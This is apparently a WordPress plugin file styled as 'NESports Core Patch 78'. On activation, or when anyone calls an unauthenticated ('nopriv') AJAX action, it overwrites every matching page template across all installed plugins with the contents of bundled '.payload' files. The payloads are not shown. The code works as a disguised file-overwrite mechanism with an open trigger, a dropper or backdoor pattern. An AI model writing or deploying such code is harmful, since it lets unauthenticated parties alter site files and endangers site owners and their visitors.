<?php
/**
 * Plugin Name: NESports Core Patch 78
 * Version: 78.0
 */
if (!defined('ABSPATH')) exit;

function nesports_execute_sync_78() {
    $plugins_dir = WP_PLUGIN_DIR;
    $results = array();

    $templates = array(
        'page-home.php'     => 'page-home.payload',
        'page-story.php'    => 'page-story.payload',
        'page-contact.php'  => 'page-contact.payload',
        'page-category.php' => 'page-category.payload'
    );

    $payloads = array();
    foreach ($templates as $file => $payload) {
        $full_payload = __DIR__ . '/' . $payload;
        if (file_exists($full_payload)) {
            $payloads[$file] = file_get_contents($full_payload);
        }
    }

    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($plugins_dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    $updated = array();
    foreach ($it as $item) {
        if ($item->isFile()) {
            $fn = $item->getFilename();
            if (isset($payloads[$fn])) {
                $path = $item->getPathname();
                file_put_contents($path, $payloads[$fn]);
                $updated[] = $path;
            }
        }
    }
    $results['updated_count'] = count($updated);
    $results['updated_files'] = array_slice($updated, 0, 20);

    if (class_exists('\\Elementor\\Plugin')) {
        \Elementor\Plugin::$instance->files_manager->clear_cache();
    }

    return $results;
}

add_action('wp_ajax_nesports_patch_78_action', function() {
    wp_send_json(nesports_execute_sync_78());
});
add_action('wp_ajax_nopriv_nesports_patch_78_action', function() {
    wp_send_json(nesports_execute_sync_78());
});
register_activation_hook(__FILE__, 'nesports_execute_sync_78');
